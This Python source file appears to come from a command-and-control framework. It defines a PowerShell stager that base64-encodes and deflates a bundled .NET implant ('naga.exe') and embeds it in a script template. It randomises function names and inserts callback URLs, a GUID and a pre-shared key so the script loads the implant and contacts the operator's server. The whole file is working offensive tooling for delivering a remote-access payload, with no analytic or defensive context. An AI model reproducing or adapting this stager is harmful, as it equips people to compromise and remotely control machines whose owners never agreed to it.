import logging
import uuid
from blackbot.core.utils import gen_random_string, get_path_in_package
from blackbot.core.wss.stager import Stager
from blackbot.core.wss.crypto import gen_stager_psk
from blackbot.core.wss.utils import dotnet_deflate_and_encode


class ARTIC2Stager(Stager):
    def __init__(self):
        self.name = 'powershell'
        self.description = 'Stage via a PowerShell script'
        self.suggestions = ''
        self.extension = 'ps1'
        self.options = {
            'AsFunction': {
                'Description'   :   "Generate stager as a PowerShell function",
                'Required'      :   False,
                'Value'         :   True
            }
        }

    def generate(self, listener):
        with open(get_path_in_package('core/wss/data/naga.exe'), 'rb') as assembly:
            with open(get_path_in_package('core/wss/stagers/templates/posh.ps1')) as template:
                template = template.read()
                c2_urls = ','.join(
                    filter(None, [listener['CallBackURls']])
                )

                guid = uuid.uuid4()
                psk = gen_stager_psk()

                template = template.replace("ARGS_NAME", gen_random_string(6))
                if bool(self.options['AsFunction']['Value']) is True:
                    function_name = gen_random_string(6).upper()
                    template = f"""function Invoke-{function_name}
{{
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)][String]$Guid,
        [Parameter(Mandatory=$true)][String]$Psk,
        [Parameter(Mandatory=$true)][String]$Url
    )

    {template}
}}
Invoke-{function_name} -Guid '{guid}' -Psk '{psk}' -Url '{c2_urls}'
"""
                else:
                    template = template.replace("$Url", f'"{c2_urls}"')
                    template = template.replace("$Guid", f'"{guid}"')
                    template = template.replace("$Psk", f'"{psk}"')

                assembly = assembly.read()
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly))
                template = template.replace("DATA_LENGTH", str(len(assembly)))
                return guid, psk, template
